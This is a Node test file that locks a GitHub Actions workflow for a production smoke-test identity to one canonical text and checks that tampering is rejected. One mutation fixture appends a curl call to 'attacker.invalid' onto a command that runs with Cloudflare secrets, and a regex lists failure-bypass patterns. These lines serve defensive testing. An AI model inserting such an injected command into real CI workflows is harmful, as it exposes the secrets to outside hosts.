import assert from 'node:assert/strict';
import fs from 'node:fs';
import test from 'node:test';

const LIFECYCLE_WORKFLOW_URL = new URL(
  '../.github/workflows/manage-smoke-identity.yml',
  import.meta.url,
);
const DEPLOY_WORKFLOW_URL = new URL(
  '../.github/workflows/deploy-worker.yml',
  import.meta.url,
);
const SHARED_CONCURRENCY = /^concurrency:\n  group: hereisorder-production-\$\{\{ github\.ref \}\}\n  cancel-in-progress: false$/m;
const FAILURE_BYPASS = /continue-on-error|always\(|failure\(|\|\|\s*true|set\s+\+e/;
const PASSWORD_LINE = '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}';
const CONFIRMATION_LINE = '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}';
const CANONICAL_LIFECYCLE_WORKFLOW = [
  'name: Manage production smoke identity',
  '',
  'on:',
  '  workflow_dispatch:',
  '    inputs:',
  '      action:',
  '        description: Fixed lifecycle operation',
  '        required: true',
  '        type: choice',
  '        options:',
  '          - provision',
  '          - rotate',
  '          - disable',
  '      confirmation:',
  '        description: Type the exact MANAGE confirmation for the selected action',
  '        required: true',
  '        type: string',
  '',
  'permissions:',
  '  contents: read',
  '',
  'concurrency:',
  '  group: hereisorder-production-${{ github.ref }}',
  '  cancel-in-progress: false',
  '',
  'jobs:',
  '  manage:',
  '    name: Manage fixed production smoke identity',
  '    runs-on: ubuntu-latest',
  '    timeout-minutes: 10',
  '    steps:',
  '      - name: Reject a non-main ref',
  '        if: github.ref != \'refs/heads/main\'',
  '        run: exit 1',
  '',
  '      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0',
  '        with:',
  '          persist-credentials: false',
  '',
  '      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0',
  '        with:',
  '          node-version: \'22.23.1\'',
  '          cache: \'npm\'',
  '',
  '      - name: Install dependencies',
  '        run: npm ci',
  '',
  '      - name: Provision fixed smoke identity',
  '        if: inputs.action == \'provision\'',
  '        run: npm run db:manage-smoke-identity -- provision --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Rotate fixed smoke identity',
  '        if: inputs.action == \'rotate\'',
  '        run: npm run db:manage-smoke-identity -- rotate --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Disable fixed smoke identity',
  '        if: inputs.action == \'disable\'',
  '        run: npm run db:manage-smoke-identity -- disable --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Reject an invalid lifecycle action',
  '        if: inputs.action != \'provision\' && inputs.action != \'rotate\' && inputs.action != \'disable\'',
  '        run: exit 1',
].join('\n') + '\n';

function readLifecycleWorkflow() {
  return fs.readFileSync(LIFECYCLE_WORKFLOW_URL, 'utf8');
}

function readDeployWorkflow() {
  return fs.readFileSync(DEPLOY_WORKFLOW_URL, 'utf8');
}

function assertLifecycleContract(workflow) {
  assert.equal(workflow, CANONICAL_LIFECYCLE_WORKFLOW);
}

const dangerousMutations = [
  {
    name: 'adds a schedule trigger',
    mutate(workflow) {
      return workflow.replace(
        '        type: string\n\npermissions:',
        '        type: string\n  schedule:\n    - cron: "0 0 * * *"\n\npermissions:',
      );
    },
  },
  {
    name: 'suffixes a lifecycle command with curl',
    mutate(workflow) {
      return workflow.replace(
        'run: npm run db:manage-smoke-identity -- provision --remote',
        'run: npm run db:manage-smoke-identity -- provision --remote && curl https://attacker.invalid',
      );
    },
  },
  {
    name: 'moves the provision password into rotate',
    mutate(workflow) {
      const withoutProvisionPassword = workflow.replace(`${PASSWORD_LINE}\n`, '');
      return withoutProvisionPassword.replace(
        `${PASSWORD_LINE}\n${CONFIRMATION_LINE}`,
        `${PASSWORD_LINE}\n${PASSWORD_LINE}\n${CONFIRMATION_LINE}`,
      );
    },
  },
  {
    name: 'removes the disable confirmation',
    mutate(workflow) {
      const marker = `${CONFIRMATION_LINE}\n\n      - name: Reject an invalid lifecycle action`;
      return workflow.replace(marker, '      - name: Reject an invalid lifecycle action');
    },
  },
  {
    name: 'adds a job-level main condition',
    mutate(workflow) {
      return workflow.replace(
        '    name: Manage fixed production smoke identity\n    runs-on: ubuntu-latest',
        "    name: Manage fixed production smoke identity\n    if: github.ref == 'refs/heads/main' && github.event_name == 'workflow_dispatch'\n    runs-on: ubuntu-latest",
      );
    },
  },
];

test('lifecycle workflow exactly matches the canonical safety contract', () => {
  assertLifecycleContract(readLifecycleWorkflow());
});

test('deployment shares canonical non-cancelling repository/ref concurrency', () => {
  const workflow = readDeployWorkflow();
  assert.match(workflow, SHARED_CONCURRENCY);
  assert.doesNotMatch(workflow, /group: \$\{\{ github\.workflow \}\}/);
});

test('lifecycle workflow has no failure-bypass surface', () => {
  assert.doesNotMatch(readLifecycleWorkflow(), FAILURE_BYPASS);
});

test('canonical lifecycle contract rejects dangerous mutations', async (t) => {
  const workflow = readLifecycleWorkflow();
  for (const { name, mutate } of dangerousMutations) {
    await t.test(name, () => {
      const mutated = mutate(workflow);
      assert.notEqual(mutated, workflow, 'mutation fixture must change the workflow');
      assert.throws(
        () => assertLifecycleContract(mutated),
        { name: 'AssertionError' },
      );
    });
  }
});
